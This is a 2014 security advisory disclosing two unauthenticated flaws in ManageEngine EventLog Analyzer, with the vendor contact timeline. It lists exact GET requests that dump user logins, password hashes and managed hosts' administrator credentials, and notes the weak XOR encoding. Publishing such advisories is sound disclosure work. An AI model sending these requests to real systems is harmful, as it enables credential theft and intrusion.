@@ -1,0 +1,73 @@
+>> Multiple vulnerabilities in ManageEngine EventLog Analyzer
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+==========================================================================
+Disclosure: 05/11/2014 / Last updated: 05/11/2014
+
+>> Background on the affected product:
+"EventLog Analyzer provides the most cost-effective Security Information and Event Management (SIEM) software on the market. Using this Log Analyzer software, organizations can automate the entire process of managing terabytes of machine generated logs by collecting, analyzing, correlating, searching, reporting, and archiving from one central location. This event log analyzer software helps to monitor file integrity, conduct log forensics analysis, monitor privileged users and comply to different compliance regulatory bodies by intelligently analyzing your logs and instantly generating a variety of reports like user activity reports, historical trend reports, and more."
+
+
+>> Technical details:
+#1
+Vulnerability: SQL database information disclosure (read any table in the database)
+CVE-2014-6038
+Constraints: none; no authentication or any other information needed. On v7 the url has to be prepended with /event/.
+Affected versions: all versions from v7 to v9.9 build 9002.
+
+GET /agentHandler?mode=getTableData&table=[tableName]
+GET /agentHandler?mode=getTableData&table=AaaUser --> user logins
+GET /agentHandler?mode=getTableData&table=AaaPassword --> user passwords (MD5 hashed) and salts
+GET /agentHandler?mode=getTableData&table=AaaPasswordHint --> user password hints
+GET /agentHandler?mode=getTableData&table=HostDetails --> Windows / AS/400 managed hosts Administrator usernames and passwords (XOR'ed with 0x30)
+
+
+#2
+Vulnerability: Windows / AS/400 managed hosts Administrator credentials disclosure
+CVE-2014-6039
+Constraints: none; no authentication or any other information needed. On v7 the url has to be prepended with /event/.
+Affected versions: all versions from v7 to v9.9 build 9002.
+
+GET /hostdetails?slid=X&hostid=Y
+GET /hostdetails?slid=1&hostid=1 --> Windows / AS/400 hosts superuser username and password (XOR'ed with 0x30 and base64 encoded)
+
+
+A Metasploit exploit that abuses these two vulnerabilities to obtain the managed device superuser credentials has been released.
+
+
+>> Fix:
+UNFIXED - ManageEngine failed to take action after 70 days.
+
+Timeline of disclosure:
+28/08/2014 
+- Requested contact to email via ManageEngine Security Response Center
+- Received email from support and sent details about the vulnerabilities above and a third vulnerability (remote code execution via file upload).
+           
+28/08/2014 
+- ManageEngine acknowledge the receipt and promise to keep me informed of the progress.
+           
+31/08/2014 
+- hong10 releases details about the remote code execution via file upload vulnerability which I had discovered. Apparently he discovered and communicated it to ManageEngine over a year ago and no action had been taken (see http://seclists.org/fulldisclosure/2014/Aug/86).
+- I ask ManageEngine why I hadn't been informed that one of my vulnerabilities had already been disclosed to them over a year ago. They respond with "We appreciate your efforts and will fix your vulnerabilities, please bear with us".
+- With hong10's support, I release an exploit for the remote code execution vulnerability (see http://seclists.org/fulldisclosure/2014/Aug/88). I also remove the vulnerability information from this report since it has already been discovered and disclosed by hong10.
+
+11/09/2014
+- Asked for an update on progress. Received a response a day after "the development team will include the fix in our next release".
+
+13/10/2014
+- Asked for an update on progress. No response.
+
+17/10/2014
+- Informed ManageEngine that will release details and an exploit the next day if no reply is received.
+
+19/10/2014
+- Attempted escalation via the project manager for Desktop Central. EventLog support team replies on the next day apologising for not responding and saying will get back to me as soon as possible.
+
+05/11/2014
+- Informed EventLog support that would release details and exploit today. Received reply stating "we are working on this but cannot commit to a date; the new version has a tentative release date of end of quarter".
+- Released advisory and exploit 70 days after initial contact (interesting fact: it's been 67 days since the release of my exploit for hong10's vulnerability and EventLog Analyzer is still vulnerable to remote code execution).
+
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
